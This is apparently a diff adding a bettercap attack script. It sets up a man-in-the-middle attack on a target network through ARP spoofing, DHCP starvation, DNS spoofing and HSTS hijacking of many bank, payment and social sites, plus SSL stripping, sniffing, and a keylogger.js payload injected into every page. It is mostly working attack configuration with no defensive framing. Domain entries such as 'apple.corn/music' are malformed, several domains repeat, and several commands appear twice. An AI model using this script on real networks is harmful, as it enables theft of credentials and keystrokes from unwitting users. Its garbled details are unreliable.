@@ -1,0 +1,67 @@
+# Enable network probing
+net.probe on
+
+# Enable network reconnaissance
+net.recon on
+
+# Enable full-duplex ARP spoofing
+set arp.spoof.fullduplex true
+
+# Set the target IP for ARP spoofing
+set arp.spoof.targets [Target IP]
+
+# Enable gateway spoofing
+set arp.spoof.gateway true
+
+# Enable DHCP starvation
+set dhcp.starvation on
+
+# Set the DHCP starvation target
+set dhcp.starvation.targets [Target IP]
+
+# Enable DNS spoofing
+set dns.spoof.domains {twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,instagram.corn,*.instagram.corn,youtube.corn,*.youtube.corn,whatsapp.corn,*.whatsapp.corn,amazon.corn,flipkart.corn,*.flipkart.corn,snapdeal.corn,*.snapdeal.corn,hotstar.corn,*.hotstar.corn,linkedin.corn,*.linkedin.corn,reddit.corn,*.reddit.corn,telegram.corn,*.telegram.corn,quora.corn,*.quora.corn,zomato.corn,*.zomato.corn,swiggy.corn,*.swiggy.corn,irctc.corn,*.irctc.corn,paytm.corn,*.paytm.corn,ola.corn,*.ola.corn,uber.corn,*.uber.corn,bookmyshow.corn,*.bookmyshow.corn,makemytrip.corn,*.makemytrip.corn,goibibo.corn,*.goibibo.corn,myntra.corn,*.myntra.corn,ajio.corn,*.ajio.corn,icicibank.corn,*.icicibank.corn,hdfcbank.corn,*.hdfcbank.corn,sbi.corn,*.sbi.corn,axisbank.corn,*.axisbank.corn,indianexpress.corn,*.indianexpress.corn,timesofindia.indiatimes.corn,*.timesofindia.indiatimes.corn,ndtv.corn,*.ndtv.corn,news18.corn,*.news18.corn,bhaskar.corn,*.bhaskar.corn,moneycontrol.corn,*.moneycontrol.corn,livemint.corn,*.livemint.corn,hindustantimes.corn,*.hindustantimes.corn,flipboard.corn,*.flipboard.corn,naukri.corn,*.naukri.corn,monsterindia.corn,*.monsterindia.corn,shine.corn,*.shine.corn,twitter.corn,*.twitter.corn,tumblr.corn,*.tumblr.corn,pinterest.corn,*.pinterest.corn,soundcloud.corn,*.soundcloud.corn,gaana.corn,*.gaana.corn,jiosaavn.corn,*.jiosaavn.corn,wynk.corn,*.wynk.corn,tiktok.corn,*.tiktok.corn,vimeo.corn,*.vimeo.corn,vine.corn,*.vine.corn,amazon.corn,*.amazon.corn,walmart.corn,*.walmart.corn,alibaba.corn,*.alibaba.corn,rakuten.corn,*.rakuten.corn,thehindu.corn,*.thehindu.corn,theguardian.corn,*.theguardian.corn,bbc.corn,*.bbc.corn,cnn.corn,*.cnn.corn,nytimes.corn,*.nytimes.corn,cleartrip.corn,*.cleartrip.corn,trivago.corn,*.trivago.corn,kayak.corn,*.kayak.corn,expedia.corn,*.expedia.corn,bankofamerica.corn,*.bankofamerica.corn,chase.corn,*.chase.corn,wellsfargo.corn,*.wellsfargo.corn,paypal.corn,*.paypal.corn,skype.corn,*.skype.corn,slack.corn,*.slack.corn,discord.corn,*.discord.corn,hulu.corn,*.hulu.corn,spotify.corn,*.spotify.corn,apple.corn/music,*.apple.corn/music,uber.corn/eats,*.uber.corn/eats,doordash.corn,*.doordash.corn,grubhub.corn,*.grubhub.corn,lyft.corn,*.lyft.corn,coursera.corn,*.coursera.corn,edx.corn,*.edx.corn,khanacademy.corn,*.khanacademy.corn,udemy.corn,*.udemy.corn,olx.corn,*.olx.corn,quikr.corn,*.quikr.corn}
+
+# Enable SSL/TLS interception
+set sslstrip.enable true
+set sslstrip.ports {80,443,8080}
+
+# Enable local packet sniffing
+set net.sniff.local true
+
+# Set the output file for captured packets
+set net.sniff.output /path/to/your/capture/file.cap
+
+# Enable packet sniffing
+net.sniff on
+
+# Enable ARP spoofing
+arp.spoof on
+
+# Enable HTTP proxy
+set http.proxy.script /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set hstshijack.log /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore *
+set hstshijack.targets {twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,instagram.corn,*.instagram.corn,youtube.corn,*.youtube.corn,whatsapp.corn,*.whatsapp.corn,amazon.corn,flipkart.corn,*.flipkart.corn,snapdeal.corn,*.snapdeal.corn,hotstar.corn,*.hotstar.corn,linkedin.corn,*.linkedin.corn,reddit.corn,*.reddit.corn,telegram.corn,*.telegram.corn,quora.corn,*.quora.corn,zomato.corn,*.zomato.corn,swiggy.corn,*.swiggy.corn,irctc.corn,*.irctc.corn,paytm.corn,*.paytm.corn,ola.corn,*.ola.corn,uber.corn,*.uber.corn,bookmyshow.corn,*.bookmyshow.corn,makemytrip.corn,*.makemytrip.corn,goibibo.corn,*.goibibo.corn,myntra.corn,*.myntra.corn,ajio.corn,*.ajio.corn,icicibank.corn,*.icicibank.corn,hdfcbank.corn,*.hdfcbank.corn,sbi.corn,*.sbi.corn,axisbank.corn,*.axisbank.corn,indianexpress.corn,*.indianexpress.corn,timesofindia.indiatimes.corn,*.timesofindia.indiatimes.corn,ndtv.corn,*.ndtv.corn,news18.corn,*.news18.corn,bhaskar.corn,*.bhaskar.corn,moneycontrol.corn,*.moneycontrol.corn,livemint.corn,*.livemint.corn,hindustantimes.corn,*.hindustantimes.corn,flipboard.corn,*.flipboard.corn,naukri.corn,*.naukri.corn,monsterindia.corn,*.monsterindia.corn,shine.corn,*.shine.corn,twitter.corn,*.twitter.corn,tumblr.corn,*.tumblr.corn,pinterest.corn,*.pinterest.corn,soundcloud.corn,*.soundcloud.corn,gaana.corn,*.gaana.corn,jiosaavn.corn,*.jiosaavn.corn,wynk.corn,*.wynk.corn,tiktok.corn,*.tiktok.corn,vimeo.corn,*.vimeo.corn,vine.corn,*.vine.corn,amazon.corn,*.amazon.corn,walmart.corn,*.walmart.corn,alibaba.corn,*.alibaba.corn,rakuten.corn,*.rakuten.corn,thehindu.corn,*.thehindu.corn,theguardian.corn,*.theguardian.corn,bbc.corn,*.bbc.corn,cnn.corn,*.cnn.corn,nytimes.corn,*.nytimes.corn,cleartrip.corn,*.cleartrip.corn,trivago.corn,*.trivago.corn,kayak.corn,*.kayak.corn,expedia.corn,*.expedia.corn,bankofamerica.corn,*.bankofamerica.corn,chase.corn,*.chase.corn,wellsfargo.corn,*.wellsfargo.corn,paypal.corn,*.paypal.corn,skype.corn,*.skype.corn,slack.corn,*.slack.corn,discord.corn,*.discord.corn,hulu.corn,*.hulu.corn,spotify.corn,*.spotify.corn,apple.corn/music,*.apple.corn/music,uber.corn/eats,*.uber.corn/eats,doordash.corn,*.doordash.corn,grubhub.corn,*.grubhub.corn,lyft.corn,*.lyft.corn,coursera.corn,*.coursera.corn,edx.corn,*.edx.corn,khanacademy.corn,*.khanacademy.corn,udemy.corn,*.udemy.corn,olx.corn,*.olx.corn,quikr.corn,*.quikr.corn}
+set hstshijack.replacements {twitter.corn,facebook.corn,apple.corn,ebay.corn,instagram.corn,youtube.corn,whatsapp.corn,amazon.corn,flipkart.corn,snapdeal.corn,hotstar.corn,linkedin.corn,reddit.corn,telegram.corn,quora.corn,zomato.corn,swiggy.corn,irctc.corn,paytm.corn,ola.corn,uber.corn,bookmyshow.corn,makemytrip.corn,goibibo.corn,myntra.corn,ajio.corn,icicibank.corn,hdfcbank.corn,sbi.corn,axisbank.corn,indianexpress.corn,timesofindia.indiatimes.corn,ndtv.corn,news18.corn,bhaskar.corn,moneycontrol.corn,livemint.corn,hindustantimes.corn,flipboard.corn,naukri.corn,monsterindia.corn,shine.corn,twitter.corn,tumblr.corn,pinterest.corn,soundcloud.corn,gaana.corn,jiosaavn.corn,wynk.corn,tiktok.corn,vimeo.corn,vine.corn,amazon.corn,walmart.corn,alibaba.corn,rakuten.corn,thehindu.corn,theguardian.corn,bbc.corn,cnn.corn,nytimes.corn,cleartrip.corn,trivago.corn,kayak.corn,expedia.corn,bankofamerica.corn,chase.corn,wellsfargo.corn,paypal.corn,skype.corn,slack.corn,discord.corn,hulu.corn,spotify.corn,apple.corn/music,uber.corn/eats,doordash.corn,grubhub.corn,lyft.corn,coursera.corn,edx.corn,khanacademy.corn,udemy.corn,olx.corn,quikr.corn}
+set hstshijack.obfuscate false
+set hstshijack.encode false
+set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+
+# Enable DNS spoofing
+dns.spoof on
+
+# Enable DHCP starvation
+dhcp.starvation on
+
+# Enable ARP spoofing
+arp.spoof on
+
+# Enable SSL/TLS interception
+sslstrip on
+
+# Enable HTTP proxy
+http.proxy on
+
+# Enable packet sniffing
+net.sniff on
